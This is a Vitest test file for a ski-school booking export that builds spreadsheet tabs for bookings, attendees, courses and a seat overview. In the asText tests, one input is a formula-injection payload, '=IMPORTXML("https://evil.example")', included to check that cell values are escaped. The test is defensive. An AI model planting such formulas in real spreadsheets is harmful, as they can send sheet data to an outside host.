import { describe, expect, it } from 'vitest'
import { asText, buildBookingSheets, sortCourses } from './bookingSheets'

// 2026-12-01 10:30 in Berlin
const creationTime = Date.UTC(2026, 11, 1, 9, 30)
const now = new Date(Date.UTC(2026, 11, 2, 17, 0))

const booking = (overrides: Record<string, unknown> = {}) =>
  ({
    _id: 'b1',
    _creationTime: creationTime,
    orderNumber: '123456',
    firstName: 'Anna',
    lastName: 'Muster',
    address: 'Hauptstr. 1',
    zip: '79312',
    city: 'Emmendingen',
    country: 'Deutschland',
    email: 'anna@example.com',
    phone: '0170 1234567',
    priceTotal: 118,
    legalConfirmed: true,
    privacyConfirmed: true,
    newsletterConfirmed: false,
    photoConsent: true,
    returningCustomer: false,
    ...overrides,
  }) as any

const attendee = (overrides: Record<string, unknown> = {}) =>
  ({
    _id: 'a1',
    _creationTime: creationTime,
    bookingId: 'b1',
    firstName: 'Mia',
    lastName: 'Muster',
    age: 6,
    member: false,
    courses: ['ski-bambini-1'],
    priceTotal: 59,
    cancelled: false,
    ...overrides,
  }) as any

const course = (slug: string, seatLimit?: unknown) => ({
  slug,
  content: { seatLimit },
})

const build = (input: Partial<Parameters<typeof buildBookingSheets>[0]>) =>
  buildBookingSheets({ bookings: [], attendees: [], courses: [], now, ...input })

const tab = (sheets: ReturnType<typeof buildBookingSheets>, tabName: string) =>
  sheets.find((sheet) => sheet.tabName === tabName)!.data

describe('buildBookingSheets', () => {
  it('writes the tabs in a stable order with one tab per course', () => {
    const sheets = build({
      courses: [
        course('snowboard-beginner-1'),
        course('ski-beginner-1'),
        course('ski-bambini-2'),
        course('ski-bambini-1'),
      ],
    })

    expect(sheets.map(({ tabName }) => tabName)).toEqual([
      'bookings',
      'attendees',
      'cancellations',
      'ski-bambini-1',
      'ski-bambini-2',
      'ski-beginner-1',
      'snowboard-beginner-1',
      'overview',
    ])
  })

  it('lists every booking with the booker contact', () => {
    const sheets = build({ bookings: [booking()] })

    expect(tab(sheets, 'bookings')).toEqual([
      [
        'Buchungsnummer',
        'Nachname',
        'Vorname',
        'Adresse',
        'PLZ',
        'Ort',
        'Land',
        'E-Mail',
        'Telefon',
        'Gebühren',
        'Gebucht am',
        'Buchung-ID',
      ],
      [
        '123456',
        'Muster',
        'Anna',
        'Hauptstr. 1',
        '79312',
        'Emmendingen',
        'Deutschland',
        'anna@example.com',
        "'0170 1234567",
        118,
        '1.12.2026, 10:30:00',
        'b1',
      ],
    ])
  })

  it('splits attendees into active and cancelled', () => {
    const sheets = build({
      bookings: [booking()],
      attendees: [
        attendee({ _id: 'a1', firstName: 'Mia' }),
        attendee({ _id: 'a2', firstName: 'Ben', cancelled: true }),
        attendee({ _id: 'a3', firstName: 'Lea', cancelled: undefined }),
      ],
    })

    const firstNames = (rows: unknown[][]) => rows.slice(1).map((row) => row[2])
    expect(firstNames(tab(sheets, 'attendees'))).toEqual(['Mia', 'Lea'])
    expect(firstNames(tab(sheets, 'cancellations'))).toEqual(['Ben'])
  })

  it('joins attendees with their booking', () => {
    const sheets = build({
      bookings: [booking()],
      attendees: [
        attendee({ member: true, courses: ['ski-bambini-1', 'ski-bambini-2'] }),
      ],
    })

    expect(tab(sheets, 'attendees')[1]).toEqual([
      '123456',
      'Muster',
      'Mia',
      6,
      true,
      'ski-bambini-1, ski-bambini-2',
      '1.12.2026, 10:30:00',
      'b1',
      'a1',
      'ja',
    ])
  })

  it('leaves booking columns empty for an attendee without booking', () => {
    const sheets = build({ attendees: [attendee({ bookingId: 'missing' })] })

    expect(tab(sheets, 'attendees')[1]).toEqual([
      undefined,
      'Muster',
      'Mia',
      6,
      false,
      'ski-bambini-1',
      '',
      undefined,
      'a1',
      'nein',
    ])
  })

  it('lists the active attendees of a course with the course card text', () => {
    const sheets = build({
      bookings: [booking()],
      attendees: [
        attendee({ _id: 'a1', courses: ['ski-bambini-1', 'ski-bambini-2'] }),
        attendee({ _id: 'a2', courses: ['ski-bambini-2'] }),
        attendee({ _id: 'a3', courses: ['ski-bambini-1'], cancelled: true }),
      ],
      courses: [course('ski-bambini-1'), course('ski-bambini-2')],
    })

    const bambini1 = tab(sheets, 'ski-bambini-1')
    expect(bambini1).toEqual([
      [
        'Buchungsnummer',
        'Nachname',
        'Vorname',
        'Alter',
        'Mitglied',
        'Kurse',
        'Gebucht am',
        'Text Kurskarte',
        'Buchung-ID',
        'Teilnehmer-ID',
        'Fotos erlaubt',
      ],
      [
        '123456',
        'Muster',
        'Mia',
        '6',
        'false',
        'ski-bambini-1, ski-bambini-2',
        '1.12.2026, 10:30:00',
        'Muster Mia (6) ✆ 0170 1234567',
        'b1',
        'a1',
        'ja',
      ],
      [],
      ['Aktualisiert am 2.12.2026, 18:00:00'],
    ])
    expect(
      tab(sheets, 'ski-bambini-2')
        .slice(1, -2)
        .map((row) => row[9]),
    ).toEqual(['a1', 'a2'])
  })

  it('writes a course tab even without attendees', () => {
    const sheets = build({ courses: [course('ski-champion-1')] })

    expect(tab(sheets, 'ski-champion-1').slice(1)).toEqual([
      [],
      ['Aktualisiert am 2.12.2026, 18:00:00'],
    ])
  })

  it('ignores courses booked by attendees that are not in Storyblok', () => {
    const sheets = build({
      attendees: [attendee({ courses: ['ski-old-1'] })],
      courses: [course('ski-bambini-1')],
    })

    expect(sheets.map(({ tabName }) => tabName)).not.toContain('ski-old-1')
    expect(tab(sheets, 'overview').map((row) => row[0])).not.toContain(
      'ski-old-1',
    )
  })
})

describe('overview tab', () => {
  const overview = (input: Partial<Parameters<typeof buildBookingSheets>[0]>) =>
    tab(build(input), 'overview')

  it('counts the seats per course like the booking flow', () => {
    const rows = overview({
      bookings: [booking()],
      attendees: [
        attendee({ _id: 'a1', courses: ['ski-bambini-1', 'ski-beginner-1'] }),
        attendee({ _id: 'a2', courses: ['ski-bambini-1'] }),
        attendee({ _id: 'a3', courses: ['ski-bambini-1'], cancelled: true }),
      ],
      courses: [
        course('ski-beginner-1', 8),
        course('ski-bambini-1', '8'),
        course('ski-champion-1', ''),
        course('snowboard-beginner-1'),
      ],
    })

    expect(rows.slice(0, 5)).toEqual([
      ['Kurs', 'Teilnehmerzahl', 'Plätze gesamt', 'Noch frei'],
      ['ski-bambini-1', 2, 8, 6],
      ['ski-beginner-1', 1, 8, 7],
      // An empty seat limit means no limit, as in the booking flow
      ['ski-champion-1', 0, '?', ''],
      ['snowboard-beginner-1', 0, '?', ''],
    ])
  })

  it('shows overbooked courses with negative free seats', () => {
    const rows = overview({
      attendees: [attendee({ _id: 'a1' }), attendee({ _id: 'a2' })],
      courses: [course('ski-bambini-1', 1)],
    })

    expect(rows[1]).toEqual(['ski-bambini-1', 2, 1, -1])
  })

  it('keeps the totals row in place for up to 19 courses', () => {
    const rows = overview({ courses: [course('ski-bambini-1', 8)] })

    expect(rows).toHaveLength(24)
    expect(rows[21]).toEqual([
      'Gesamt',
      '=SUMME(B2:B20)',
      '=SUMME(C2:C20)',
      '=SUMME(D2:D20)',
    ])
    expect(rows[23]).toEqual(['Aktualisiert am 2.12.2026, 18:00:00'])
  })

  it('sums all courses when there are more than 19', () => {
    const courses = Array.from({ length: 25 }, (_, i) =>
      course(`ski-bambini-${i + 1}`, 8),
    )
    const rows = overview({ courses })

    const totals = rows.find((row) => row[0] === 'Gesamt')
    expect(totals).toEqual([
      'Gesamt',
      '=SUMME(B2:B26)',
      '=SUMME(C2:C26)',
      '=SUMME(D2:D26)',
    ])
    expect(rows[25][0]).toBe('ski-bambini-25')
  })
})

describe('asText', () => {
  it.each([
    ['0170 1234567', "'0170 1234567"],
    ['01701234567', "'01701234567"],
    ['+49 170 1234567', "'+49 170 1234567"],
    ['=IMPORTXML("https://evil.example")', '\'=IMPORTXML("https://evil.example")'],
    ['-Muster', "'-Muster"],
    ['@home', "'@home"],
    ['Muster', 'Muster'],
    ['79312', '79312'],
    ['0', '0'],
    ['', ''],
    [undefined, ''],
  ])('keeps %j as text', (value, expected) => {
    expect(asText(value)).toBe(expected)
  })
})

describe('sortCourses', () => {
  it('sorts by course offering and then by number', () => {
    const slugs = [
      'snowboard-beginner-1',
      'ski-champion-1',
      'ski-junior-champion-1',
      'ski-beginner-10',
      'ski-beginner-2',
      'unknown-course',
      'ski-erwachsene-1',
      'ski-bambini-1',
    ]

    expect(slugs.sort(sortCourses)).toEqual([
      'ski-bambini-1',
      'ski-beginner-2',
      'ski-beginner-10',
      'ski-junior-champion-1',
      'ski-champion-1',
      'ski-erwachsene-1',
      'snowboard-beginner-1',
      'unknown-course',
    ])
  })
})
